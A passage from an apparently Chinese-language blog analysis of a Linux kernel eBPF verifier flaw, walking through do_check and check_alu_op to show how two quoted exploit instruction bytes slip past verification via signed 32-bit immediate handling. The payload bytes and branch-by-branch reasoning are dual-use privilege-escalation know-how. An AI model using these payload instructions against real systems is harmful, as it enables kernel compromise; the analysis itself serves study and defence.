class="line"></span><br><span class="line">        if (log_level) &#123;</span><br><span class="line">            verbose(&quot;%d: &quot;, insn_idx);</span><br><span class="line">            print_bpf_insn(insn);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (class &#x3D;&#x3D; BPF_ALU || class &#x3D;&#x3D; BPF_ALU64) &#123; &#x2F;&#x2F;判断class类型，此为第一句payload进入的分支</span><br><span class="line">            err &#x3D; check_alu_op(env, insn);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line"></span><br><span class="line">        &#125; else if (class &#x3D;&#x3D; BPF_LDX) &#123;</span><br><span class="line">            enum bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">            &#x2F;* check for reserved fields is already done *&#x2F;</span><br><span class="line"></span><br><span class="line">            &#x2F;* check src operand *&#x2F;</span><br><span class="line">            err &#x3D; check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line"></span><br><span class="line">            err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line"></span><br><span class="line">            src_reg_type &#x3D; regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">            &#x2F;* check that memory (src_reg + off) is readable,</span><br><span class="line">             * the state of dst_reg will be updated by this func</span><br><span class="line">             *&#x2F;</span><br><span class="line">            err &#x3D; check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">                           insn-&gt;dst_reg);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line"></span><br><span class="line">            if (BPF_SIZE(insn-&gt;code) !&#x3D; BPF_W) &#123;</span><br><span class="line">                insn_idx++;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (insn-&gt;imm &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                &#x2F;* saw a valid insn</span><br><span class="line">                 * dst_reg &#x3D; *(u32 *)(src_reg + off)</span><br><span class="line">                 * use reserved &#39;imm&#39; field to mark this insn</span><br><span class="line">                 *&#x2F;</span><br><span class="line">                insn-&gt;imm &#x3D; src_reg_type;</span><br><span class="line"></span><br><span class="line">            &#125; else if (src_reg_type !&#x3D; insn-&gt;imm &amp;&amp;</span><br><span class="line">                   (src_reg_type &#x3D;&#x3D; PTR_TO_CTX ||</span><br><span class="line">                    insn-&gt;imm &#x3D;&#x3D; PTR_TO_CTX)) &#123;</span><br><span class="line">                &#x2F;* ABuser program is trying to use the same insn</span><br><span class="line">                 * dst_reg &#x3D; *(u32*) (src_reg + off)</span><br><span class="line">                 * with different pointer types:</span><br><span class="line">                 * src_reg &#x3D;&#x3D; ctx in one branch and</span><br><span class="line">                 * src_reg &#x3D;&#x3D; stack|map in some other branch.</span><br><span class="line">                 * Reject it.</span><br><span class="line">                 *&#x2F;</span><br><span class="line">                verbose(&quot;same insn cannot be used with different pointers\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; else if (class &#x3D;&#x3D; BPF_STX) &#123;</span><br><span class="line">            enum bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">            if (BPF_MODE(insn-&gt;code) &#x3D;&#x3D; BPF_XADD) &#123;</span><br><span class="line">                err &#x3D; check_xadd(env, insn);</span><br><span class="line">                if (err)</span><br><span class="line">                    return err;</span><br><span class="line">                insn_idx++;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;* check src1 operand *&#x2F;</span><br><span class="line">            err &#x3D; check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line">            &#x2F;* check src2 operand *&#x2F;</span><br><span class="line">            err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line"></span><br><span class="line">            dst_reg_type &#x3D; regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">            &#x2F;* check that memory (dst_reg + off) is writeable *&#x2F;</span><br><span class="line">            err &#x3D; check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                           insn-&gt;src_reg);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line"></span><br><span class="line">            if (insn-&gt;imm &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                insn-&gt;imm &#x3D; dst_reg_type;</span><br><span class="line">            &#125; else if (dst_reg_type !&#x3D; insn-&gt;imm &amp;&amp;</span><br><span class="line">                   (dst_reg_type &#x3D;&#x3D; PTR_TO_CTX ||</span><br><span class="line">                    insn-&gt;imm &#x3D;&#x3D; PTR_TO_CTX)) &#123;</span><br><span class="line">                verbose(&quot;same insn cannot be used with different pointers\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; else if (class &#x3D;&#x3D; BPF_ST) &#123;</span><br><span class="line">            if (BPF_MODE(insn-&gt;code) !&#x3D; BPF_MEM ||</span><br><span class="line">                insn-&gt;src_reg !&#x3D; BPF_REG_0) &#123;</span><br><span class="line">                verbose(&quot;BPF_ST uses reserved fields\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;* check src operand *&#x2F;</span><br><span class="line">            err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line"></span><br><span class="line">            &#x2F;* check that memory (dst_reg + off) is writeable *&#x2F;</span><br><span class="line">            err &#x3D; check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                           -1);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line"></span><br><span class="line">        &#125; else if (class &#x3D;&#x3D; BPF_JMP) &#123; &#x2F;&#x2F; 第二行payload进入此分支</span><br><span class="line">            u8 opcode &#x3D; BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">            if (opcode &#x3D;&#x3D; BPF_CALL) &#123;</span><br><span class="line">                if (BPF_SRC(insn-&gt;code) !&#x3D; BPF_K ||</span><br><span class="line">                    insn-&gt;off !&#x3D; 0 ||</span><br><span class="line">                    insn-&gt;src_reg !&#x3D; BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg !&#x3D; BPF_REG_0) &#123;</span><br><span class="line">                    verbose(&quot;BPF_CALL uses reserved fields\n&quot;);</span><br><span class="line">                    return -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                err &#x3D; check_call(env, insn-&gt;imm);</span><br><span class="line">                if (err)</span><br><span class="line">                    return err;</span><br><span class="line"></span><br><span class="line">            &#125; else if (opcode &#x3D;&#x3D; BPF_JA) &#123;</span><br><span class="line">                if (BPF_SRC(insn-&gt;code) !&#x3D; BPF_K ||</span><br><span class="line">                    insn-&gt;imm !&#x3D; 0 ||</span><br><span class="line">                    insn-&gt;src_reg !&#x3D; BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg !&#x3D; BPF_REG_0) &#123;</span><br><span class="line">                    verbose(&quot;BPF_JA uses reserved fields\n&quot;);</span><br><span class="line">                    return -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                insn_idx +&#x3D; insn-&gt;off + 1;</span><br><span class="line">                continue;</span><br><span class="line"></span><br><span class="line">            &#125; else if (opcode &#x3D;&#x3D; BPF_EXIT) &#123;</span><br><span class="line">                if (BPF_SRC(insn-&gt;code) !&#x3D; BPF_K ||</span><br><span class="line">                    insn-&gt;imm !&#x3D; 0 ||</span><br><span class="line">                    insn-&gt;src_reg !&#x3D; BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg !&#x3D; BPF_REG_0) &#123;</span><br><span class="line">                    verbose(&quot;BPF_EXIT uses reserved fields\n&quot;);</span><br><span class="line">                    return -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                &#x2F;* eBPF calling convetion is such that R0 is used</span><br><span class="line">                 * to return the value from eBPF program.</span><br><span class="line">                 * Make sure that it&#39;s readable at this time</span><br><span class="line">                 * of bpf_exit, which means that program wrote</span><br><span class="line">                 * something into it earlier</span><br><span class="line">                 *&#x2F;</span><br><span class="line">                err &#x3D; check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">                if (err)</span><br><span class="line">                    return err;</span><br><span class="line"></span><br><span class="line">                if (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">                    verbose(&quot;R0 leaks addr as return value\n&quot;);</span><br><span class="line">                    return -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">process_bpf_exit:</span><br><span class="line">                insn_idx &#x3D; pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">                if (insn_idx &lt; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    do_print_state &#x3D; true;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123; &#x2F;&#x2F; 第二行payload进入此分支</span><br><span class="line">                err &#x3D; check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">                if (err)</span><br><span class="line">                    return err;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (class &#x3D;&#x3D; BPF_LD) &#123;</span><br><span class="line">            u8 mode &#x3D; BPF_MODE(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">            if (mode &#x3D;&#x3D; BPF_ABS || mode &#x3D;&#x3D; BPF_IND) &#123;</span><br><span class="line">                err &#x3D; check_ld_abs(env, insn);</span><br><span class="line">                if (err)</span><br><span class="line">                    return err;</span><br><span class="line"></span><br><span class="line">            &#125; else if (mode &#x3D;&#x3D; BPF_IMM) &#123;</span><br><span class="line">                err &#x3D; check_ld_imm(env, insn);</span><br><span class="line">                if (err)</span><br><span class="line">                    return err;</span><br><span class="line"></span><br><span class="line">                insn_idx++;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                verbose(&quot;invalid BPF_LD mode\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            verbose(&quot;unknown insn class %d\n&quot;, class);</span><br><span class="line">            return -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        insn_idx++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么来看第一行<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code></p>
<p>通过<code>BPF_CLASS</code>宏计算class后，可以得出class：<code>0xb4 &amp; 0x07 = 0x04</code></p>
<p>那么进入<code>if (class == BPF_ALU || class == BPF_ALU64)</code>分支，执行<code>check_alu_op</code>函数</p>
<p>来看看<code>check_alu_op</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* check validity of 32-bit and 64-bit arithmetic operations *&#x2F;</span><br><span class="line">static int check_alu_op(struct verifier_env *env, struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">    struct reg_state *regs &#x3D; env-&gt;cur_state.regs;</span><br><span class="line">    u8 opcode &#x3D; BPF_OP(insn-&gt;code); &#x2F;&#x2F; BPF_OP宏：#define BPF_OP(code) ((code) &amp; 0xf0)</span><br><span class="line">    int err;</span><br><span class="line"></span><br><span class="line">    if (opcode &#x3D;&#x3D; BPF_END || opcode &#x3D;&#x3D; BPF_NEG) &#123;</span><br><span class="line">        if (opcode &#x3D;&#x3D; BPF_NEG) &#123;</span><br><span class="line">            if (BPF_SRC(insn-&gt;code) !&#x3D; 0 ||</span><br><span class="line">                insn-&gt;src_reg !&#x3D; BPF_REG_0 ||</span><br><span class="line">                insn-&gt;off !&#x3D; 0 || insn-&gt;imm !&#x3D; 0) &#123;</span><br><span class="line">                verbose(&quot;BPF_NEG uses reserved fields\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (insn-&gt;src_reg !&#x3D; BPF_REG_0 || insn-&gt;off !&#x3D; 0 ||</span><br><span class="line">                (insn-&gt;imm !&#x3D; 16 &amp;&amp; insn-&gt;imm !&#x3D; 32 &amp;&amp; insn-&gt;imm !&#x3D; 64)) &#123;</span><br><span class="line">                verbose(&quot;BPF_END uses reserved fields\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;* check src operand *&#x2F;</span><br><span class="line">        err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">        if (err)</span><br><span class="line">            return err;</span><br><span class="line"></span><br><span class="line">        if (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">            verbose(&quot;R%d pointer arithmetic prohibited\n&quot;,</span><br><span class="line">                insn-&gt;dst_reg);</span><br><span class="line">            return -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;* check dest operand *&#x2F;</span><br><span class="line">        err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</span><br><span class="line">        if (err)</span><br><span class="line">            return err;</span><br><span class="line"></span><br><span class="line">    &#125; else if (opcode &#x3D;&#x3D; BPF_MOV) &#123; &#x2F;&#x2F; 判断指令是否是MOV指令，第一句payload进入此分支</span><br><span class="line"></span><br><span class="line">        if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_X) &#123; </span><br><span class="line">            if (insn-&gt;imm !&#x3D; 0 || insn-&gt;off !&#x3D; 0) &#123;</span><br><span class="line">                verbose(&quot;BPF_MOV uses reserved fields\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;* check src operand *&#x2F;</span><br><span class="line">            err &#x3D; check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (insn-&gt;src_reg !&#x3D; BPF_REG_0 || insn-&gt;off !&#x3D; 0) &#123;</span><br><span class="line">                verbose(&quot;BPF_MOV uses reserved fields\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;* check dest operand *&#x2F;</span><br><span class="line">        err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, DST_OP); &#x2F;&#x2F;检查操作数</span><br><span class="line">        if (err)</span><br><span class="line">            return err;</span><br><span class="line"></span><br><span class="line">        if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_X) &#123;</span><br><span class="line">            if (BPF_CLASS(insn-&gt;code) &#x3D;&#x3D; BPF_ALU64) &#123;</span><br><span class="line">                &#x2F;* case: R1 &#x3D; R2</span><br><span class="line">                 * copy register state to dest reg</span><br><span class="line">                 *&#x2F;</span><br><span class="line">                regs[insn-&gt;dst_reg] &#x3D; regs[insn-&gt;src_reg];</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">                    verbose(&quot;R%d partial copy of pointer\n&quot;,</span><br><span class="line">                        insn-&gt;src_reg);</span><br><span class="line">                    return -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line">                regs[insn-&gt;dst_reg].type &#x3D; UNKNOWN_VALUE;</span><br><span class="line">                regs[insn-&gt;dst_reg].map_ptr &#x3D; NULL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;* case: R &#x3D; imm</span><br><span class="line">             * remember the value we stored into this reg</span><br><span class="line">             *&#x2F;</span><br><span class="line">            regs[insn-&gt;dst_reg].type &#x3D; CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm &#x3D; insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else if (opcode &gt; BPF_END) &#123;</span><br><span class="line">        verbose(&quot;invalid BPF_ALU opcode %x\n&quot;, opcode);</span><br><span class="line">        return -EINVAL;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;    &#x2F;* all other ALU ops: and, sub, xor, add, ... *&#x2F;</span><br><span class="line"></span><br><span class="line">        bool stack_relative &#x3D; false;</span><br><span class="line"></span><br><span class="line">        if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_X) &#123;</span><br><span class="line">            if (insn-&gt;imm !&#x3D; 0 || insn-&gt;off !&#x3D; 0) &#123;</span><br><span class="line">                verbose(&quot;BPF_ALU uses reserved fields\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;* check src1 operand *&#x2F;</span><br><span class="line">            err &#x3D; check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            if (err)</span><br><span class="line">                return err;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (insn-&gt;src_reg !&#x3D; BPF_REG_0 || insn-&gt;off !&#x3D; 0) &#123;</span><br><span class="line">                verbose(&quot;BPF_ALU uses reserved fields\n&quot;);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;* check src2 operand *&#x2F;</span><br><span class="line">        err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">        if (err)</span><br><span class="line">            return err;</span><br><span class="line"></span><br><span class="line">        if ((opcode &#x3D;&#x3D; BPF_MOD || opcode &#x3D;&#x3D; BPF_DIV) &amp;&amp;</span><br><span class="line">            BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K &amp;&amp; insn-&gt;imm &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            verbose(&quot;div by zero\n&quot;);</span><br><span class="line">            return -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ((opcode &#x3D;&#x3D; BPF_LSH || opcode &#x3D;&#x3D; BPF_RSH ||</span><br><span class="line">             opcode &#x3D;&#x3D; BPF_ARSH) &amp;&amp; BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K) &#123;</span><br><span class="line">            int size &#x3D; BPF_CLASS(insn-&gt;code) &#x3D;&#x3D; BPF_ALU64 ? 64 : 32;</span><br><span class="line"></span><br><span class="line">            if (insn-&gt;imm &lt; 0 || insn-&gt;imm &gt;&#x3D; size) &#123;</span><br><span class="line">                verbose(&quot;invalid shift %d\n&quot;, insn-&gt;imm);</span><br><span class="line">                return -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;* pattern match &#39;bpf_add Rx, imm&#39; instruction *&#x2F;</span><br><span class="line">        if (opcode &#x3D;&#x3D; BPF_ADD &amp;&amp; BPF_CLASS(insn-&gt;code) &#x3D;&#x3D; BPF_ALU64 &amp;&amp;</span><br><span class="line">            regs[insn-&gt;dst_reg].type &#x3D;&#x3D; FRAME_PTR &amp;&amp;</span><br><span class="line">            BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K) &#123;</span><br><span class="line">            stack_relative &#x3D; true;</span><br><span class="line">        &#125; else if (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">            verbose(&quot;R%d pointer arithmetic prohibited\n&quot;,</span><br><span class="line">                insn-&gt;dst_reg);</span><br><span class="line">            return -EACCES;</span><br><span class="line">        &#125; else if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_X &amp;&amp;</span><br><span class="line">               is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">            verbose(&quot;R%d pointer arithmetic prohibited\n&quot;,</span><br><span class="line">                insn-&gt;src_reg);</span><br><span class="line">            return -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;* check dest operand *&#x2F;</span><br><span class="line">        err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</span><br><span class="line">        if (err)</span><br><span class="line">            return err;</span><br><span class="line"></span><br><span class="line">        if (stack_relative) &#123;</span><br><span class="line">            regs[insn-&gt;dst_reg].type &#x3D; PTR_TO_STACK;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm &#x3D; insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在此函数中，先计算<code>opcode</code>的值：<code>0xb4 &amp; 0xf0 = 0xb0</code></p>
<p>此值为BPF_MOV宏的值，进入<code>else if (opcode == BPF_MOV)</code>分支</p>
<p>通过一系列校验后，我们主要关心的就是这里的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">    &#x2F;* case: R &#x3D; imm</span><br><span class="line">     * remember the value we stored into this reg</span><br><span class="line">     *&#x2F;</span><br><span class="line">    regs[insn-&gt;dst_reg].type &#x3D; CONST_IMM;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm &#x3D; insn-&gt;imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里将<code>imm</code>，也即<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>中的<code>0xffffffff</code>保存进虚拟执行的寄存器中，记录此mov指令的结果</p>
<p>不急着往下走，先来看看<code>regs[insn-&gt;dst_reg].imm</code>以及<code>insn-&gt;imm</code>的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct reg_state &#123;</span><br><span class="line">    enum bpf_reg_type type;</span><br><span class="line">    union &#123;</span><br><span class="line">        &#x2F;* valid when type &#x3D;&#x3D; CONST_IMM | PTR_TO_STACK *&#x2F;</span><br><span class="line">        int imm;</span><br><span class="line"></span><br><span class="line">        &#x2F;* valid when type &#x3D;&#x3D; CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span><br><span class="line">         *   PTR_TO_MAP_VALUE_OR_NULL</span><br><span class="line">         *&#x2F;</span><br><span class="line">        struct bpf_map *map_ptr;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">struct bpf_insn &#123;</span><br><span class="line">    __u8    code;        &#x2F;* opcode *&#x2F;</span><br><span class="line">    __u8    dst_reg:4;    &#x2F;* dest register *&#x2F;</span><br><span class="line">    __u8    src_reg:4;    &#x2F;* source register *&#x2F;</span><br><span class="line">    __s16    off;        &#x2F;* signed offset *&#x2F;</span><br><span class="line">    __s32    imm;        &#x2F;* signed immediate constant *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到这两个值的数据类型是一致的，都是32位有符号整数</p>
<p>到这儿没有什么问题，<code>check_alu_op</code>返回，<code>do_check</code>函数继续循环检查下一行指令</p>
<p>来看第二行指令 <code>\x55\x09\x02\x00\xff\xff\xff\xff</code></p>
<p>还是老样子，先计算class: <code>0x55 &amp; 0x07 = 0x05</code></p>
<p>此为<code>JMP</code>类型的指令，进入<code>else if (class == BPF_JMP)</code>分支，计算opcode：<code>0x55 &amp; 0xf0 = 0x50</code></p>
<p>根据opcode，执行<code>check_cond_jmp_op</code>函数</p>
<p>函数如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 